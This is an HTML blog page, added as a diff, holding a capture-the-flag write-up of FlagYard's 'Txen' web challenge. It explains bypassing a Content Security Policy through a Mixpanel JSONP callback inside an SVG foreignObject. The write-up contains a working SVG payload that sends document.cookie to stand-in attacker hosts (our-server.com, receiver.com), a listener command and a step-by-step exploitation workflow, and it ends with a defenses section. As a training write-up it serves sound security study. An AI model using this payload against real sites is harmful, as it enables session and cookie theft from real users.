@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Txen – [Web] (Medium) - FlagYard | m7eesn blog</title>
+<meta name="title" content="Txen – [Web] (Medium) - FlagYard" />
+<meta name="description" content="1. Challenge Overview
+Challenge Description
+
+We proudly introduce our latest, completely impractical file-sharing service.
+
+Txen is a web exploitation challenge from FlagYard that presents a deceptively simple file-sharing application. Users can upload files through a straightforward endpoint. The catch? There&rsquo;s an admin bot that visits user-provided URLs, and hidden somewhere in its browser session is a flag cookie we need to steal.
+At first glance, this seems straightforward—upload a malicious SVG, make the bot view it, exfiltrate the cookie. The reality is much trickier. The server has implemented a strict Content Security Policy that blocks most traditional attack vectors. Our task: find a creative bypass that respects the CSP while still executing arbitrary JavaScript in the bot&rsquo;s browser." />
+<meta name="keywords" content="" />
+
+
+<meta property="og:url" content="https://blog.looter.dev/blog/2025-10-25-flagyard-txen-web-challenge/">
+  <meta property="og:site_name" content="m7eesn blog">
+  <meta property="og:title" content="Txen – [Web] (Medium) - FlagYard">
+  <meta property="og:description" content="1. Challenge Overview Challenge Description We proudly introduce our latest, completely impractical file-sharing service.
+Txen is a web exploitation challenge from FlagYard that presents a deceptively simple file-sharing application. Users can upload files through a straightforward endpoint. The catch? There’s an admin bot that visits user-provided URLs, and hidden somewhere in its browser session is a flag cookie we need to steal.
+At first glance, this seems straightforward—upload a malicious SVG, make the bot view it, exfiltrate the cookie. The reality is much trickier. The server has implemented a strict Content Security Policy that blocks most traditional attack vectors. Our task: find a creative bypass that respects the CSP while still executing arbitrary JavaScript in the bot’s browser.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-10-25T20:40:00+00:00">
+    <meta property="article:modified_time" content="2025-10-25T20:40:00+00:00">
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Txen – [Web] (Medium) - FlagYard">
+  <meta name="twitter:description" content="1. Challenge Overview Challenge Description We proudly introduce our latest, completely impractical file-sharing service.
+Txen is a web exploitation challenge from FlagYard that presents a deceptively simple file-sharing application. Users can upload files through a straightforward endpoint. The catch? There’s an admin bot that visits user-provided URLs, and hidden somewhere in its browser session is a flag cookie we need to steal.
+At first glance, this seems straightforward—upload a malicious SVG, make the bot view it, exfiltrate the cookie. The reality is much trickier. The server has implemented a strict Content Security Policy that blocks most traditional attack vectors. Our task: find a creative bypass that respects the CSP while still executing arbitrary JavaScript in the bot’s browser.">
+
+
+
+
+  <meta itemprop="name" content="Txen – [Web] (Medium) - FlagYard">
+  <meta itemprop="description" content="1. Challenge Overview Challenge Description We proudly introduce our latest, completely impractical file-sharing service.
+Txen is a web exploitation challenge from FlagYard that presents a deceptively simple file-sharing application. Users can upload files through a straightforward endpoint. The catch? There’s an admin bot that visits user-provided URLs, and hidden somewhere in its browser session is a flag cookie we need to steal.
+At first glance, this seems straightforward—upload a malicious SVG, make the bot view it, exfiltrate the cookie. The reality is much trickier. The server has implemented a strict Content Security Policy that blocks most traditional attack vectors. Our task: find a creative bypass that respects the CSP while still executing arbitrary JavaScript in the bot’s browser.">
+  <meta itemprop="datePublished" content="2025-10-25T20:40:00+00:00">
+  <meta itemprop="dateModified" content="2025-10-25T20:40:00+00:00">
+  <meta itemprop="wordCount" content="927">
+  <meta itemprop="keywords" content="Ctf,Writeup,Flagyard">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+    --width: 720px;
+    --font-main: Verdana, sans-serif;
+    --font-secondary: Verdana, sans-serif;
+    --font-scale: 1em;
+    --background-color: #fff;
+    --heading-color: #222;
+    --text-color: #444;
+    --link-color: #3273dc;
+    --visited-color: #8b6fcb;
+    --blockquote-color: #222;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --background-color: #01242e;
+      --heading-color: #eee;
+      --text-color: #ddd;
+      --link-color: #8cc2dd;
+      --visited-color: #8b6fcb;
+      --blockquote-color: #ccc;
+    }
+  }
+
+  body {
+    font-family: var(--font-secondary);
+    font-size: var(--font-scale);
+    margin: auto;
+    padding: 20px;
+    max-width: var(--width);
+    text-align: left;
+    background-color: var(--background-color);
+    word-wrap: break-word;
+    overflow-wrap: break-word;
+    line-height: 1.5;
+    color: var(--text-color);
+  }
+
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6 {
+    font-family: var(--font-main);
+    color: var(--heading-color);
+  }
+
+  a {
+    color: var(--link-color);
+    cursor: pointer;
+    text-decoration: none;
+  }
+
+  a:hover {
+    text-decoration: underline;
+  }
+
+  nav a {
+    margin-right: 8px;
+  }
+
+  strong,
+  b {
+    color: var(--heading-color);
+  }
+
+  button {
+    margin: 0;
+    cursor: pointer;
+  }
+
+  time {
+    font-family: monospace;
+    font-style: normal;
+    font-size: 15px;
+  }
+
+  main {
+    line-height: 1.6;
+  }
+
+  table {
+    width: 100%;
+  }
+
+  hr {
+    border: 0;
+    border-top: 1px dashed;
+  }
+
+  img {
+    max-width: 100%;
+  }
+
+  code {
+    font-family: monospace;
+    padding: 2px;
+    border-radius: 3px;
+  }
+
+  blockquote {
+    border-left: 1px solid #999;
+    color: var(--blockquote-color);
+    padding-left: 20px;
+    font-style: italic;
+  }
+
+  footer {
+    padding: 25px 0;
+    text-align: center;
+  }
+
+  .title:hover {
+    text-decoration: none;
+  }
+
+  .title h1 {
+    font-size: 1.5em;
+  }
+
+  .inline {
+    width: auto !important;
+  }
+
+  .highlight,
+  .code {
+    border-radius: 3px;
+    margin-block-start: 1em;
+    margin-block-end: 1em;
+    overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+    list-style-type: none;
+    padding: unset;
+  }
+
+  ul.blog-posts li {
+    display: flex;
+  }
+
+  ul.blog-posts li span {
+    flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+    color: var(--visited-color);
+  }
+
+</style>
+<style>
+  code {
+    padding: 4px 8px !important;
+    margin: 0 4px !important;
+    background-color: rgba(0, 0, 0, 0.05);
+  }
+
+   
+  div.highlight {
+    background-color: rgba(15, 1, 1, 0.801);
+    border-radius: 3px;
+  }
+
+  div.highlight pre {
+    padding: 1em !important;
+    margin: 0 !important;
+    background-color: transparent !important;
+    display: inline-block;
+    min-width: 100%;
+  }
+
+  div.highlight code {
+    padding: 0 !important;
+    margin: 0 !important;
+    background-color: transparent !important;
+    display: inline-block;
+    min-width: 100%;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    code {
+      background-color: rgba(255, 255, 255, 0.1);
+    }
+
+    div.highlight {
+      background-color: rgba(0, 0, 0, 0.3);
+    }
+  }
+</style></head>
+
+<body>
+  <header><a href="https://blog.looter.dev/" class="title">
+  <h2>m7eesn blog</h2>
+</a>
+<nav>
+</nav>
+</header>
+  <main>
+
+<h1>Txen – [Web] (Medium) - FlagYard</h1>
+<p>
+  <i>
+    <time datetime='2025-10-25'>
+      25 Oct, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <h2 id="1-challenge-overview">1. Challenge Overview</h2>
+<h3 id="challenge-description">Challenge Description</h3>
+<blockquote>
+<p><em>We proudly introduce our latest, completely impractical file-sharing service.</em></p>
+</blockquote>
+<p>Txen is a web exploitation challenge from FlagYard that presents a deceptively simple file-sharing application. Users can upload files through a straightforward endpoint. The catch? There&rsquo;s an admin bot that visits user-provided URLs, and hidden somewhere in its browser session is a flag cookie we need to steal.</p>
+<p>At first glance, this seems straightforward—upload a malicious SVG, make the bot view it, exfiltrate the cookie. The reality is much trickier. The server has implemented a <strong>strict Content Security Policy</strong> that blocks most traditional attack vectors. Our task: find a creative bypass that respects the CSP while still executing arbitrary JavaScript in the bot&rsquo;s browser.</p>
+<hr>
+<h2 id="2-reconnaissance--initial-analysis">2. Reconnaissance &amp; Initial Analysis</h2>
+<h3 id="the-csp-gauntlet">The CSP Gauntlet</h3>
+<p>The first thing we discover when the bot loads our SVG is the response headers:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">image/svg+xml</span>
+</span></span><span style="display:flex;"><span>Content-Security-Policy<span style="color:#f92672">:</span> <span style="color:#ae81ff">script-src &#39;self&#39; *.facebook.com *.mixpanel.com platform.twitter.com syndication.twitter.com;</span>
+</span></span></code></pre></div><p>Let&rsquo;s break down what this policy allows:</p>
+<ul>
+<li><code>'self'</code> — scripts loaded from the same origin only</li>
+<li><code>*.facebook.com</code> — Facebook&rsquo;s domain and subdomains</li>
+<li><code>*.mixpanel.com</code> — Mixpanel analytics</li>
+<li><code>platform.twitter.com</code> and <code>syndication.twitter.com</code> — Twitter&rsquo;s specific endpoints</li>
+</ul>
+<p>What it <strong>blocks</strong>:</p>
+<ul>
+<li>Inline <code>&lt;script&gt;</code> tags</li>
+<li>Event handlers (<code>onclick</code>, <code>onerror</code>, etc.)</li>
+<li><code>eval()</code> or similar</li>
+<li>Arbitrary third-party domains</li>
+</ul>
+<h3 id="svg-in-the-same-origin-context">SVG in the Same-Origin Context</h3>
+<p>A critical observation: when the server serves our SVG with <code>Content-Type: image/svg+xml</code> and same-origin URL, the browser loads it in the <strong>same security context</strong> as the main page. This means:</p>
+<ol>
+<li>Our SVG can access <code>document.cookie</code> if we execute JavaScript</li>
+<li>But CSP still applies—we can&rsquo;t just inline scripts</li>
+</ol>
+<p>However, we notice the CSP doesn&rsquo;t have explicit <code>frame-src</code> or <code>img-src</code> restrictions. This is important for later.</p>
+<h3 id="the-mixpanel-clue">The Mixpanel Clue</h3>
+<p><code>*.mixpanel.com</code> in the CSP is the smoking gun. Mixpanel is a web analytics platform that supports <strong>JSONP callbacks</strong>. Many analytics endpoints use JSONP for cross-origin requests, accepting a <code>callback</code> parameter and wrapping the response in that callback function.</p>
+<p>For example:</p>
+<pre tabindex="0"><code>https://api.mixpanel.com/track?data=eyJkIjp7fX0=&amp;callback=mycallback
+</code></pre><p>Might return:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">mycallback</span>({<span style="color:#e6db74">&#34;status&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;ok&#34;</span>})
+</span></span></code></pre></div><p><strong>The key insight</strong>: If we can control the <code>callback</code> parameter with an arrow function, we can inject arbitrary code that will execute within the CSP-allowed Mixpanel domain.</p>
+<hr>
+<h2 id="3-building-the-exploit">3. Building the Exploit</h2>
+<h3 id="step-1-understanding-svgs-foreignobject">Step 1: Understanding SVG&rsquo;s foreignObject</h3>
+<p>SVG has a powerful feature: the <code>&lt;foreignObject&gt;</code> element allows embedding HTML/XML content directly into SVG. When rendered, these foreign objects become part of the DOM in the page&rsquo;s security context.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;400&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;300&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;foreignObject</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;20&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;90&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;150&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;200&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- HTML content here gets rendered in the page context --&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;p</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xhtml&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">&lt;!-- We can embed anything here --&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/p&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/foreignObject&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/svg&gt;</span>
+</span></span></code></pre></div><p>The critical detail: the <code>&lt;script&gt;</code> tag within a <code>&lt;foreignObject&gt;</code> respects CSP, but <code>&lt;script src=&quot;&quot;&gt;</code> can load from CSP-allowed origins.</p>
+<h3 id="step-2-crafting-the-jsonp-callback-payload">Step 2: Crafting the JSONP Callback Payload</h3>
+<p>We want to execute:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://our-server.com?cookie=&#39;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>
+</span></span></code></pre></div><p>This sends the cookie to our attacker-controlled server via an image request (a technique that bypasses CORS restrictions since the browser always sends cookies with image requests to same-origin or cross-origin with credentials).</p>
+<p>We wrap this in an arrow function as a JSONP callback:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(()=&gt;{<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://our-server.com?c=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>})
+</span></span></code></pre></div><p>But we need to be careful—URL encoding is essential. When we embed this in a URL, special characters like <code>+</code>, <code>&amp;</code>, <code>=</code>, etc., need proper encoding:</p>
+<pre tabindex="0"><code>(()=&gt;{new Image().src=&#39;https://our-server.com?c=&#39;%2bdocument.cookie})
+</code></pre><p>(Note: <code>%2b</code> is the URL-encoded form of <code>+</code>)</p>
+<h3 id="step-3-constructing-the-final-svg-payload">Step 3: Constructing the Final SVG Payload</h3>
+<p>Here&rsquo;s our refined attack vector:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;foreignObject</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;20&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;90&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;150&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;200&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;p</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xhtml&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;script</span> <span style="color:#a6e22e">src=</span><span style="color:#e6db74">&#34;https://api.mixpanel.com/track?data=eyJkIjp7fX0=&amp;amp;ip=1&amp;amp;callback=(()=&amp;gt;{new+Image().src=&#39;https://receiver.com?c=&#39;%2bdocument.cookie})&#34;</span><span style="color:#f92672">&gt;&lt;/script&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/p&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/foreignObject&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/svg&gt;</span>
+</span></span></code></pre></div><p>Breaking this down:</p>
+<ul>
+<li>The <code>&lt;script src&gt;</code> loads from <code>api.mixpanel.com</code>, which is CSP-allowed</li>
+<li>The <code>data</code> parameter contains base64-encoded dummy data (required by Mixpanel API)</li>
+<li>The <code>callback</code> parameter contains our malicious arrow function, URL-encoded</li>
+<li>When the script loads, Mixpanel executes: <code>(()=&gt;{...})({...})</code>, which is immediately invoked</li>
+<li>Inside our function, we create an <code>Image</code> object and set its <code>src</code> to our exfil endpoint with the cookie</li>
+</ul>
+<hr>
+<h2 id="4-exploitation-workflow">4. Exploitation Workflow</h2>
+<h3 id="phase-1-set-up-command--control">Phase 1: Set Up Command &amp; Control</h3>
+<p>Before launching the attack, we need a server listening for incoming cookie exfiltration:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Simple Python HTTP server to capture requests</span>
+</span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">8000</span>
+</span></span></code></pre></div><p>When the bot visits our payload and the JavaScript executes, we&rsquo;ll see requests like:</p>
+<pre tabindex="0"><code>GET /track?c=FLAG{...} HTTP/1.1
+</code></pre><h3 id="phase-2-create-and-upload-the-payload">Phase 2: Create and Upload the Payload</h3>
+<ol>
+<li>Save the SVG payload above to a file (e.g., <code>payload.svg</code>)</li>
+<li>Upload it to the Txen file-sharing service</li>
+<li>The server responds with a URL like <code>https://txen-app.com/public/uploads/abc123.svg</code></li>
+</ol>
+<h3 id="phase-3-trigger-the-bot">Phase 3: Trigger the Bot</h3>
+<p>Report the upload URL to the admin bot:</p>
+<pre tabindex="0"><code>https://txen-app.com/uploads/abc123.svg
+</code></pre><blockquote>
+<p>Note we removed the <code>/public</code> segment from the URL to match the bot&rsquo;s expected path.</p>
+</blockquote>
+<h3 id="phase-4-capture-the-cookie">Phase 4: Capture the Cookie</h3>
+<p>The bot:</p>
+<ol>
+<li>Loads our SVG file</li>
+<li>Parses the <code>&lt;foreignObject&gt;</code> and <code>&lt;script&gt;</code> tag</li>
+<li>Requests from <code>https://api.mixpanel.com/track?...</code></li>
+<li>Mixpanel wraps our callback and returns the JavaScript</li>
+<li>The IIFE executes, creating an <code>Image</code> object</li>
+<li>The image <code>src</code> is set to our exfil server with <code>document.cookie</code> appended</li>
+<li>The browser sends the request with the bot&rsquo;s cookies attached</li>
+<li>We capture the flag cookie on our server</li>
+</ol>
+<hr>
+<h2 id="5-key-learnings">5. Key Learnings</h2>
+<p><strong>Why This Works:</strong></p>
+<ul>
+<li>SVG&rsquo;s <code>foreignObject</code> allows us to embed executable scripts while staying in the same security context</li>
+<li>CSP allowlists specific domains but doesn&rsquo;t prevent JSONP callback injection</li>
+<li>JSONP endpoints that accept <code>callback</code> parameters are notorious for this vulnerability</li>
+<li>Mixpanel (and similar analytics services) are frequent vectors because they&rsquo;re explicitly allowed in CSPs</li>
+</ul>
+<p><strong>Defenses Against This:</strong></p>
+<ol>
+<li>Never allowlist third-party analytics or social media domains that support JSONP in CSP</li>
+<li>Use <code>strict-dynamic</code> in CSP to prevent script injection vectors</li>
+<li>Disable JSONP callbacks or use proper callback validation</li>
+<li>Implement <code>SameSite=Strict</code> on sensitive cookies to prevent exfiltration</li>
+<li>Use sub-resource integrity (SRI) for external scripts</li>
+</ol>
+<p>This challenge perfectly illustrates how even &ldquo;restrictive&rdquo; security policies can be bypassed with creative thinking and knowledge of third-party service vulnerabilities.</p>
+
+</content>
+
+
+
+<p>
+  
+</p>
+
+  </main>
+  <footer></footer>
+
+  
+</body>
+
+</html>
